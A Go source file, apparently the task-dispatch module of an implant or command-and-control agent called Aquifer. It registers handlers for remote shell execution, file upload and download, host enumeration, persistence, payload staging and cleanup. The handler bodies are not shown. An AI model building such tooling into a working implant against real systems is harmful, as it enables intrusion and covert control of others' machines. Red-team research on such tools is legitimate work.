package tasking

import (
	"fmt"
	"sync"
	"time"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
)

// HandlerFunc is the signature for all task handler functions.
// It receives a task and returns output bytes and an optional error.
type HandlerFunc func(task config.Task) ([]byte, error)

// TaskHandler dispatches incoming tasks to registered handler functions.
type TaskHandler struct {
	mu       sync.RWMutex
	handlers map[string]HandlerFunc
}

// NewTaskHandler creates a new TaskHandler with an empty handler map.
func NewTaskHandler() *TaskHandler {
	return &TaskHandler{
		handlers: make(map[string]HandlerFunc),
	}
}

// Register adds a handler function for the given task type.
// It is safe for concurrent use.
func (th *TaskHandler) Register(taskType string, fn HandlerFunc) {
	th.mu.Lock()
	defer th.mu.Unlock()
	th.handlers[taskType] = fn
}

// Handle dispatches a task to the appropriate registered handler and
// returns a TaskResult. If no handler is registered for the task type,
// the result contains an error message.
func (th *TaskHandler) Handle(task config.Task) *config.TaskResult {
	th.mu.RLock()
	fn, ok := th.handlers[task.Type]
	th.mu.RUnlock()

	result := &config.TaskResult{
		ID:        task.ID,
		Timestamp: time.Now().Unix(),
	}

	if !ok {
		result.Error = fmt.Sprintf("unknown task type: %s", task.Type)
		return result
	}

	output, err := fn(task)
	result.Output = output
	if err != nil {
		result.Error = err.Error()
	}

	return result
}

// RegisterDefaults registers all built-in task type handlers.
func (th *TaskHandler) RegisterDefaults() {
	th.Register("shell", ExecuteShell)
	th.Register("upload", UploadFile)
	th.Register("download", DownloadFile)
	th.Register("ls", ListDirectory)
	th.Register("ps", GetProcessList)
	th.Register("netstat", GetNetworkInfo)
	th.Register("ifconfig", GetInterfaceInfo)
	th.Register("whoami", GetUserInfo)
	th.Register("persist", InstallPersistence)
	th.Register("cleanup", Cleanup)
	th.Register("stage", StagePayload)
	th.Register("sysinfo", GetSystemInfo)
}
